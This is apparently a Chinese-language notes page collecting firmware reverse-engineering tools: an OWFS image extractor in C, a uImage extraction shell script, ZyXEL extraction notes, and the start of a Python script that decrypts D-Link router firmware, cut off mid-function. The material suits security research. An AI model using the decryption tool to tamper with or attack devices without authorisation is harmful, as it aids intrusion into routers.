<li>unowfs.c<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Utility to extract files from OWFS file system images.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * $ gcc -Wall unowfs.c -o unowfs</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Craig Heffner, 20 June 2011</span></span><br><span class="line"><span class="comment"> * http://www.devttys0.com</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAGIC <span class="meta-string">"owowowowowowowowowowowowowowowow"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAGIC_SIZE 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FILE_NAME_MAX_SIZE 40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_DEST_DIR <span class="meta-string">"owfs-root"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIRECTORY_TRAVERSAL <span class="meta-string">"../"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FILE_PREFIX <span class="meta-string">"./"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FILE_PREFIX_SIZE 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FILE_PATH_SIZE 43</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* OWFS structures */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(1)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">owfs_header</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> magic[MAGIC_SIZE];</span><br><span class="line">	<span class="keyword">uint32_t</span> version;</span><br><span class="line">	<span class="keyword">uint32_t</span> num_entries;</span><br><span class="line">	<span class="keyword">uint32_t</span> unknown;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">owfs_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> name[FILE_NAME_MAX_SIZE];</span><br><span class="line">	<span class="keyword">uint32_t</span> size;</span><br><span class="line">	<span class="keyword">uint32_t</span> offset;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Function declarations */</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">file_read</span><span class="params">(<span class="keyword">char</span> *file, <span class="keyword">size_t</span> *fsize)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_write</span><span class="params">(<span class="keyword">char</span> *file, <span class="keyword">char</span> *data, <span class="keyword">size_t</span> size)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">unowfs</span><span class="params">(<span class="keyword">char</span> *data, <span class="keyword">size_t</span> size)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> file_count = <span class="number">0</span>, retval = EXIT_FAILURE;</span><br><span class="line">	<span class="keyword">char</span> *file = <span class="literal">NULL</span>, *dir = <span class="literal">NULL</span>, *owbuf = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">size_t</span> file_size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(argc &lt; <span class="number">2</span> || argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">'-'</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nUsage: %s &lt;owfs image&gt; [destination directory]\n\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">goto</span> end;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	file = argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(argc == <span class="number">3</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		dir = argv[<span class="number">2</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		dir = DEFAULT_DEST_DIR;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	owbuf = file_read(file, &amp;file_size);</span><br><span class="line">	<span class="keyword">if</span>(!owbuf)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">goto</span> end;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(mkdir(dir, (S_IRWXU | S_IRWXG | S_IRWXO)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(dir);</span><br><span class="line">		<span class="keyword">goto</span> end;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(chdir(dir) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(dir);</span><br><span class="line">		<span class="keyword">goto</span> end;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	file_count = unowfs(owbuf, file_size);</span><br><span class="line">	<span class="keyword">if</span>(file_count &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nExtracted %d files to ./%s/\n"</span>, file_count, dir);</span><br><span class="line">		retval = EXIT_SUCCESS;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">end:</span><br><span class="line">	<span class="keyword">if</span>(owbuf) <span class="built_in">free</span>(owbuf);</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Parse and extract files from OWFS image */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">unowfs</span><span class="params">(<span class="keyword">char</span> *data, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> count = <span class="number">0</span>, i = <span class="number">0</span>, offset = <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">owfs_header</span> *<span class="title">header</span> = <span class="title">NULL</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">owfs_entry</span> * <span class="title">entry</span> = <span class="title">NULL</span>;</span></span><br><span class="line">	<span class="keyword">char</span> file_name[FILE_PATH_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Validate image size */</span></span><br><span class="line">	<span class="keyword">if</span>(size &lt; <span class="keyword">sizeof</span>(struct owfs_header))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Invalid image: size too small\n"</span>);</span><br><span class="line">		<span class="keyword">goto</span> end;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	header = (struct owfs_header *) data;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Validate magic signature */</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(header-&gt;magic, MAGIC, MAGIC_SIZE) != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Invalid image: bad magic signature\n"</span>);</span><br><span class="line">		<span class="keyword">goto</span> end;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* Values are in big endian format */</span></span><br><span class="line">	header-&gt;version = htonl(header-&gt;version);</span><br><span class="line">	header-&gt;num_entries = htonl(header-&gt;num_entries);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Extracting %d files from OWFS version %d image...\n\n"</span>, header-&gt;num_entries, header-&gt;version);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Loop through all file entries and write file data to disk */</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>,offset=<span class="keyword">sizeof</span>(struct owfs_header); (i &lt; header-&gt;num_entries &amp;&amp; offset &lt; size); i++,offset+=<span class="keyword">sizeof</span>(struct owfs_entry))</span><br><span class="line">	&#123;</span><br><span class="line">		entry = (struct owfs_entry *) (data + offset);</span><br><span class="line"></span><br><span class="line">		entry-&gt;size = htonl(entry-&gt;size);	</span><br><span class="line">		entry-&gt;offset = htonl(entry-&gt;offset);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Make sure specially crafted file names don't write outside of the destination directory */</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">strstr</span>(entry-&gt;name, DIRECTORY_TRAVERSAL))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Refusing to extract potentially malicious file: %s\n"</span>, entry-&gt;name);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Prepend './' to the file name to ensure it get written to a relative path */</span></span><br><span class="line">		<span class="built_in">memset</span>((<span class="keyword">char</span> *) &amp;file_name, <span class="number">0</span>, FILE_PATH_SIZE);</span><br><span class="line">		<span class="built_in">strncpy</span>((<span class="keyword">char</span> *) &amp;file_name, FILE_PREFIX, FILE_PREFIX_SIZE);</span><br><span class="line">		<span class="built_in">strncat</span>((<span class="keyword">char</span> *) &amp;file_name, entry-&gt;name, (FILE_PATH_SIZE - FILE_PREFIX_SIZE));</span><br><span class="line"></span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s [%d]\n"</span>, entry-&gt;name, entry-&gt;size);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Write data to disk */</span></span><br><span class="line">		<span class="keyword">if</span>(file_write((<span class="keyword">char</span> *) &amp;file_name, (data + entry-&gt;offset), entry-&gt;size))</span><br><span class="line">		&#123;</span><br><span class="line">			count++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Failed to write data to disk for file %s\n"</span>, entry-&gt;name);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">end:</span><br><span class="line">	<span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read in file contents */</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">file_read</span><span class="params">(<span class="keyword">char</span> *file, <span class="keyword">size_t</span> *fsize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> _<span class="title">fstat</span> = &#123;</span> <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="keyword">char</span> *buffer = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(stat(file,&amp;_fstat) == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">goto</span> end;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(_fstat.st_size == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">goto</span> end;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        fd = open(file,O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(!fd)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">goto</span> end;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        buffer = <span class="built_in">malloc</span>(_fstat.st_size);</span><br><span class="line">        <span class="keyword">if</span>(!buffer)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">goto</span> end;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(buffer,<span class="number">0</span>,_fstat.st_size);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(read(fd,buffer,_fstat.st_size) != _fstat.st_size)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">if</span>(buffer) <span class="built_in">free</span>(buffer);</span><br><span class="line">                buffer = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                *fsize = _fstat.st_size;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">end:</span><br><span class="line">        <span class="keyword">if</span>(fd) close(fd);</span><br><span class="line">        <span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Write data to disk */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_write</span><span class="params">(<span class="keyword">char</span> *file, <span class="keyword">char</span> *data, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	fp = fopen(file, <span class="string">"w"</span>);</span><br><span class="line">	<span class="keyword">if</span>(!fp)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(file);</span><br><span class="line">		<span class="keyword">goto</span> end;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(fwrite(data, <span class="number">1</span>, size, fp) != size)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(file);</span><br><span class="line">		<span class="keyword">goto</span> end;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	retval = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">end:</span><br><span class="line">	<span class="keyword">if</span>(fp) fclose(fp);</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="02-uImage"><a href="#02-uImage" class="headerlink" title="02-uImage"></a>02-uImage</h2><ul>
<li><a href="https://www.pentestpartners.com/security-blog/using-hexdump-analysis-for-firmware-extraction-a-how-to/" target="_blank" rel="noopener">https://www.pentestpartners.com/security-blog/using-hexdump-analysis-for-firmware-extraction-a-how-to/</a></li>
<li>随便Google即可<a href="https://gist.github.com/adamvr/1079762" target="_blank" rel="noopener">https://gist.github.com/adamvr/1079762</a></li>
<li>extract_uimage.sh<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Copyright (C) 2010 Matthias Buecher (http://www.maddes.net/)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This program is free software; you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment"># it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment"># the Free Software Foundation; either version 2 of the License, or</span></span><br><span class="line"><span class="comment"># (at your option) any later version.</span></span><br><span class="line"><span class="comment"># http://www.gnu.org/licenses/gpl-2.0.txt</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment"># but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment"># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment"># GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># You should have received a copy of the GNU General Public License</span></span><br><span class="line"><span class="comment"># along with this program; if not, write to the Free Software</span></span><br><span class="line"><span class="comment"># Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">UIMAGE=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># check for uImage magic word</span></span><br><span class="line"><span class="comment"># http://git.denx.de/cgi-bin/gitweb.cgi?p=u-boot.git;a=blob;f=include/image.h</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Checking for uImage magic word...'</span></span><br><span class="line">MAGIC=`dd <span class="keyword">if</span>=<span class="string">"<span class="variable">$&#123;UIMAGE&#125;</span>"</span> ibs=4 count=1 | hexdump -v -e <span class="string">'1/1 "%02X"'</span>`</span><br><span class="line">[ <span class="string">'27051956'</span> != <span class="string">"<span class="variable">$&#123;MAGIC&#125;</span>"</span> ]  &amp;&amp; &#123; <span class="built_in">echo</span> <span class="string">'Not an uImage.'</span> ; <span class="built_in">exit</span> 1 ; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># extract data from uImage</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'uImage recognized.'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Extracting data...'</span></span><br><span class="line">DATAFILE=<span class="string">'uImage.data'</span></span><br><span class="line">dd <span class="keyword">if</span>=<span class="string">"<span class="variable">$&#123;UIMAGE&#125;</span>"</span> of=<span class="string">"<span class="variable">$&#123;DATAFILE&#125;</span>"</span> ibs=64 skip=1</span><br><span class="line"></span><br><span class="line"><span class="comment"># check for ARM mach type ( xx 1C A0 E3 xx 10 81 E3 )</span></span><br><span class="line"><span class="comment"># http://www.simtec.co.uk/products/SWLINUX/files/booting_article.html#d0e600</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Checking for ARM mach-type...'</span></span><br><span class="line">MAGIC=`dd <span class="keyword">if</span>=<span class="string">"<span class="variable">$&#123;DATAFILE&#125;</span>"</span> ibs=1 skip=1 count=3 | hexdump -v -e <span class="string">'1/1 "%02X"'</span>`</span><br><span class="line">[ <span class="string">'1CA0E3'</span> = <span class="string">"<span class="variable">$&#123;MAGIC&#125;</span>"</span> ] &amp;&amp; &#123;</span><br><span class="line">	MAGIC=`dd <span class="keyword">if</span>=<span class="string">"<span class="variable">$&#123;DATAFILE&#125;</span>"</span> ibs=1 skip=5 count=3 | hexdump -v -e <span class="string">'1/1 "%02X"'</span>`</span><br><span class="line">	[ <span class="string">'1081E3'</span> = <span class="string">"<span class="variable">$&#123;MAGIC&#125;</span>"</span> ] &amp;&amp; &#123;</span><br><span class="line">		<span class="built_in">echo</span> <span class="string">'ARM mach-type header recognized.'</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">'Extracting mach-type header...'</span></span><br><span class="line">		dd <span class="keyword">if</span>=<span class="string">"<span class="variable">$&#123;DATAFILE&#125;</span>"</span> of=<span class="string">"uImage.mach-type"</span> ibs=8 count=1</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">		ARCH=`hexdump -v -e <span class="string">'1/1 "%02X "'</span> uImage.mach-type`</span><br><span class="line">		<span class="built_in">echo</span> <span class="string">"The mach-type is: <span class="variable">$&#123;ARCH&#125;</span>"</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">'Stripping mach-type header...'</span></span><br><span class="line">		TMPFILE=<span class="string">'uImage.tmp'</span></span><br><span class="line">		dd <span class="keyword">if</span>=<span class="string">"<span class="variable">$&#123;DATAFILE&#125;</span>"</span> of=<span class="string">"<span class="variable">$&#123;TMPFILE&#125;</span>"</span> ibs=8 skip=1</span><br><span class="line">		rm -f <span class="string">"<span class="variable">$&#123;DATAFILE&#125;</span>"</span></span><br><span class="line">		mv <span class="string">"<span class="variable">$&#123;TMPFILE&#125;</span>"</span> <span class="string">"<span class="variable">$&#123;DATAFILE&#125;</span>"</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># check for zImage, otherwise assume Image</span></span><br><span class="line"><span class="comment"># http://www.simtec.co.uk/products/SWLINUX/files/booting_article.html#d0e309</span></span><br><span class="line">TMPFILE=<span class="string">'Image'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'Checking for zImage...'</span></span><br><span class="line">MAGIC=`dd <span class="keyword">if</span>=<span class="string">"<span class="variable">$&#123;DATAFILE&#125;</span>"</span> ibs=4 skip=9 count=1 | hexdump -v -e <span class="string">'1/1 "%02X"'</span>`</span><br><span class="line">[ <span class="string">'18286F01'</span> = <span class="string">"<span class="variable">$&#123;MAGIC&#125;</span>"</span> ] &amp;&amp; &#123;</span><br><span class="line">	START=`dd <span class="keyword">if</span>=<span class="string">"<span class="variable">$&#123;DATAFILE&#125;</span>"</span> ibs=4 skip=10 count=1 | hexdump -v -e <span class="string">'1/4 "%08X"'</span>`</span><br><span class="line">	END=`dd <span class="keyword">if</span>=<span class="string">"<span class="variable">$&#123;DATAFILE&#125;</span>"</span> ibs=4 skip=11 count=1 | hexdump -v -e <span class="string">'1/4 "%08X"'</span>`</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">	SIZE=$(( 0x<span class="variable">$&#123;END&#125;</span> - 0x<span class="variable">$&#123;START&#125;</span> ))</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"zImage recognized with start 0x<span class="variable">$&#123;START&#125;</span>, end 0x<span class="variable">$&#123;END&#125;</span> and size <span class="variable">$&#123;SIZE&#125;</span>."</span></span><br><span class="line">	TMPFILE=<span class="string">'zImage'</span></span><br><span class="line">&#125;</span><br><span class="line">mv <span class="string">"<span class="variable">$&#123;DATAFILE&#125;</span>"</span> <span class="string">"<span class="variable">$&#123;TMPFILE&#125;</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ToDo: extract Image from zImage</span></span><br><span class="line"><span class="comment"># http://openinkpot.org/wiki/Documentation/ZImageFormat</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&gt;&gt;&gt; <span class="variable">$&#123;UIMAGE&#125;</span> extracted to <span class="variable">$&#123;TMPFILE&#125;</span>"</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="03-zyxel-zld-fsextract"><a href="#03-zyxel-zld-fsextract" class="headerlink" title="03-zyxel-zld_fsextract"></a>03-zyxel-zld_fsextract</h2><ul>
<li>只有2个可执行文件：unzip.mips、zld_fsextract.i386</li>
<li>readme.txt<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./zld_fsextract.i386 438ABAQ0C0.bin ./unzip.mips -f compress.img -D compress.img</span><br><span class="line"></span><br><span class="line">1 Ubuntu下失败：因为默认用qemu-mips执行unzip.mips</span><br><span class="line"></span><br><span class="line">2 但实际上：$ file unzip.mips </span><br><span class="line">unzip.mips: ELF 32-bit MSB executable, MIPS, N32 MIPS64 rel2 version 1 (SYSV), statically linked, stripped</span><br><span class="line"></span><br><span class="line">3 故需要用：qemu-mipsn32 unzip.mips</span><br><span class="line"></span><br><span class="line">4 但上述./zld_fsextract.i386命令中，无法将qemu-mipsn32 unzip.mips作为一个命令，加双引号也不行</span><br><span class="line"></span><br><span class="line">5 kali下可以（xw的，用的最新qemu</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="04-dlink"><a href="#04-dlink" class="headerlink" title="04-dlink"></a>04-dlink</h2><ul>
<li><a href="https://0x434b.dev/breaking-the-d-link-dir3060-firmware-encryption-static-analysis-part-2/" target="_blank" rel="noopener">https://0x434b.dev/breaking-the-d-link-dir3060-firmware-encryption-static-analysis-part-2/</a></li>
<li><a href="https://github.com/0xricksanchez/dlink-decrypt" target="_blank" rel="noopener">https://github.com/0xricksanchez/dlink-decrypt</a></li>
<li>dlink-dec.py</li>
<li>用法:python3 dlink-dec.py -i DIR882A1_FW130B06.bin -o out -m dec，详细见见README.md</li>
<li>适用于： DIR3060、DIR882、<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> pathlib</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> contextlib <span class="keyword">import</span> suppress</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">CIPHERTEXT_OFF = <span class="number">0x6DC</span></span><br><span class="line">SHA512_DEC_FW_W_KEY_OFF = <span class="number">0x1C</span></span><br><span class="line">SHA512_DEC_FW = <span class="number">0x5C</span></span><br><span class="line">SHA512_ENC_FW = <span class="number">0x9C</span></span><br><span class="line">IVEC_OFF = <span class="number">0xC</span></span><br><span class="line">DATA_LEN_DEC_FW_OFF = <span class="number">0x4</span></span><br><span class="line">DATALEN_DEC_FW_NO_PADDING_OFF = <span class="number">0x8</span></span><br><span class="line">IVEC_LEN = <span class="number">0x10</span></span><br><span class="line">DATA_LEN = <span class="number">0x4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DcryptLink</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, inp, outp, mode)</span>:</span></span><br><span class="line">        self.inp = inp</span><br><span class="line">        self.outp = outp</span><br><span class="line">        self.key = <span class="keyword">None</span></span><br><span class="line">        self.data_len_dec_fw_no_padding = <span class="keyword">None</span></span><br><span class="line">        self.data_len_dec_fw = <span class="keyword">None</span></span><br><span class="line">        self.ivec = <span class="keyword">None</span></span><br><span class="line">        self.mode = mode</span><br><span class="line">        self.__setup__()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setup__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.set_key()</span><br><span class="line">        self.set_datalen_variables()</span><br><span class="line">        self.set_ivec()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.mode == <span class="string">"dec"</span>:</span><br><span class="line">            self.decrypt()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.encrypt()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_expected_sha512_from_fd_at_offset</span><span class="params">(file, offset, size=<span class="number">0x40</span>)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> open(file, <span class="string">"rb"</span>) <span class="keyword">as</span> enc_fw:</span><br><span class="line">            enc_fw.seek(offset)</span><br><span class="line">            <span class="keyword">return</span> binascii.hexlify(enc_fw.read(size)).decode()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">calc_sha512_from_fd_at_offset_of_len</span><span class="params">(file, offset_payload, len_payload, key=None)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> open(file, <span class="string">"rb"</span>) <span class="keyword">as</span> enc_fw:</span><br><span class="line">            enc_fw.seek(offset_payload)</span><br><span class="line">            data = enc_fw.read(len_payload)</span><br><span class="line">            <span class="keyword">if</span> key:</span><br><span class="line">                data = data + key</span><br><span class="line">        <span class="keyword">return</span> hashlib.sha512(data).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(calculated, expected)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> expected != calculated:</span><br><span class="line">            print(<span class="string">"\t[!] Failed!"</span>)</span><br><span class="line">            <span class="keyword">raise</span> ValueError</span><br><span class="line">        print(<span class="string">"\t[+] OK!"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt_aes128_cbc</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> open(self.inp, <span class="string">"rb"</span>) <span class="keyword">as</span> enc_fw:</span><br><span class="line">            